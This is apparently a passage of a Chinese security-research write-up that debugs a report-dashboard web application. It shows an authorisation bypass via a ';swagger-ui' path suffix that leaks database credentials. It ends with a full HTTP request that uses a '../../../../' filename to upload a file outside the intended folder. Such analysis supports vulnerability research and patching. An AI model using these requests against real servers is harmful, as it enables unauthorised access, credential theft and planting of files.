我们在pageList那里下个断点，然后访问`GET /;swagger-ui/datasource/pageList`看看会怎么走，发现在这里就已经返回了mysql的账号密码，也就是我们配置好的信息，那我们得跟进去看看

![image-20241022185502441](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-87131cafe7109ebc89134d541c32f6e821dff1d5.png)

找到getrecords，定位到`protected List records = Collections.emptyList();`，在这里查询了数据列表，所以应该就是直接返回了dto所有信息导致的信息泄露

![image-20241022190114038](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-ba0a3427b64a6264ac332fe975bbd43e08c714c9.png)

最后返回的结果就是这样

![image-20241022190458898](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-e2140094b6b876140a4c5475368b19c19ad9fc1c.png)

### 任意文件上传

已知：`/reportDashboard @PostMapping("/import/{reportCode}") In the interface of importing the big screen, it accepts file uploads, does not limit the file suffix, and does not detect, filter and sterilize the file name, resulting in Arbitrary file upload vulnerability`

大概就是`/import/{reportCode}`存在任意文件上传漏洞

全局搜索一下这个接口，是一个导入zip压缩包的地方，核心是`importDashboard`

![image-20241022200628735](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-bdb8abdf93acb9892cb377a5d8bca42df6ddf834.png)

跟进importDashboard方法

![image-20241022201121206](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-9b82c95a4c850e8873735a5ffbf272d1addefa8d.png)

先用这个接口随便正常随便传个看看怎么个走法，经过测试这个接口就是导入功能，在这里

![image-20241022215916512](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-b2dfb28b048cc20334afecb95b4799fd0a098fa7.png)

调试发现是生成一个临时文件夹，然后把压缩包传到这个文件夹里面

![image-20241022215415501](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-7c4f5ed4efd1b0f26a19d6024b5ec186053386fd.png)

然后解压，解压完删除，解压失败的话就报错

![image-20241022215502520](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-7c76691dec8e87208ddbb8ff410e85ad633dd9bb.png)

但是因为解压失败了，所以也没有执行删除，导致这个文件被留盘了

![image-20241022215541120](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-e29210cebc2fb9008397f4e0a99cf2aa7e7523d3.png)

如果有目录遍历的话就可以把文件传到我们想要的目录，回头看这里获取了文件名并且进行了拼接，而且原来拼接的路径里就有`.\`

![image-20241022215759933](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-70195e032e3c7e456676352a94795731bc3b0845.png)

试一下，成功穿越目录上传

![image-20241022220229307](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-7c62007fdc4584773dff9072a1f1dd2af091e3e8.png)

![image-20241022220412506](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-9a92e2dca9a093ce607f79930b892a39b93413ca.png)

```http
POST /reportDashboard/import/123;swagger-ui/ HTTP/1.1
Host: 127.0.0.1:9095
Content-Length: 197
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7hFWIxGnbfxoTaDz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary7hFWIxGnbfxoTaDz
Content-Disposition: form-data; name="file"; filename="../../../../flag.txt"
Content-Type: application/zip

test123
------WebKitFormBoundary7hFWIxGnbfxoTaDz--
```